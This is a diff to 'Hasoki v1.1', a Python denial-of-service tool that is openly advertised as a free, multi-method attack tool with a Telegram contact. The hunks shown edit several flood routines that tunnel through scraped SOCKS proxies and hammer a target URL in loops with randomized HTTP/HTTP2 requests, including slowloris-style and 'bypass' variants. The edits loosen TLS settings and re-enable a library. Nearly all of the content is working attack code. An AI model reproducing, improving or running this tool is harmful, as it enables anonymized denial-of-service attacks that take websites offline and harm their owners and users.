@@ -3,7 +3,7 @@
 # Hasoki v1.1
 # All for FREE
 from os import system, name
-#import httpx
+import httpx
 import undetected_chromedriver as webdriver
 from httpx import AsyncClient, Headers
 import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random, socket
@@ -21,10 +21,7 @@ def countdown(t):
     while True:
         if (until - datetime.datetime.now()).total_seconds() > 0:
             stdout.flush()
-            stdout.write("\r "f"""
-╔══════════[Attack time]══════════╗     
-    Time: {str((until - datetime.datetime.now()).total_seconds())}                         
-╚═════════════════════════════════╝""")
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
         else:
             stdout.flush()
             stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
@@ -166,7 +163,6 @@ method = [
     "POST",
     "HEAD",
 ]
-#get proxy http
 #socks5resource
 proxyResources = [
     'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
@@ -734,7 +730,7 @@ def Launchslow(url, timer):
             s = socks.socksocket()
             s.connect((str(urlparse(url).netloc), int(443)))
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+            ctx = ssl.SSLContext()
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
             s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
@@ -775,9 +771,8 @@ def Launchhttp2(url, timer):
             proxy1 = random.choice(prox1)
             proxies = {'http://': 'http://'+prox1}
   #          timeout = httpx.Timeout(None, connect=None)
-            limits = httpx.Limits(max_keepalive_connections=None, max_connections=None, keepalive_expiry=60)
-            with httpx.Client(http2=True,proxies=random.choice(proxies),headers=headers, limits=limits, timeout=None,
-		                  verify=False,follow_redirects=False) as client:
+    #        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None) 
+            with httpx.Client(http2=True,proxies=random.choice(proxies),headers=headers,trust_env=False) as client:
                 try:
                     while True:
                         for _ in range(400):
@@ -827,7 +822,7 @@ def Launchspoof(url, timer):
             s = socks.socksocket()
             s.connect((str(urlparse(url).netloc), int(443)))
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+            ctx = ssl.SSLContext()
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
@@ -865,7 +860,7 @@ def LaunchSKY(url, timer):
             s = socks.socksocket()
             s.connect((str(urlparse(url).netloc), int(443)))
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+            ctx = ssl.SSLContext()
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
@@ -876,7 +871,6 @@ def LaunchSKY(url, timer):
                 s.close()
         except:
             s.close()
-
 #sky
 def attackPXHULK(url, timer, threads):
     for i in range(int(threads)):
@@ -904,7 +898,7 @@ def LaunchPXHULK(url, timer):
             s = socks.socksocket()
             s.connect((str(urlparse(url).netloc), int(443)))
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+            ctx = ssl.SSLContext()
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
@@ -942,7 +936,7 @@ def Launchbypass(url, timer):
             s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((str(urlparse(url).netloc), int(443)))
-            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+            ctx = ssl.SSLContext()
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
@@ -975,7 +969,7 @@ def LaunchSTELLAR(url, timer):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(urlparse(url).netloc), int(443)))
-            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+            ctx = ssl.SSLContext()
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
@@ -1125,7 +1119,7 @@ def title():
     stdout.write("             "+Fore.LIGHTGREEN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       PENTEST DOS MUTIL METHOD           "+Fore.LIGHTGREEN_EX  +"          ║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       ADDED NEW METHOD AND BYPASS    "+Fore.LIGHTGREEN_EX  +"              ║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Tele https://t.me/rebychubx        "+Fore.LIGHTGREEN_EX  +"          ║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Tele https://t.me/adfhjktewwyjqk   "+Fore.LIGHTGREEN_EX  +"          ║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Type [help] to see the Commands    "+Fore.LIGHTGREEN_EX +"          ║\n")
 
     stdout.write("             "+Fore.LIGHTGREEN_EX+"╚═════════════════════════════════════════════════════╝\n")
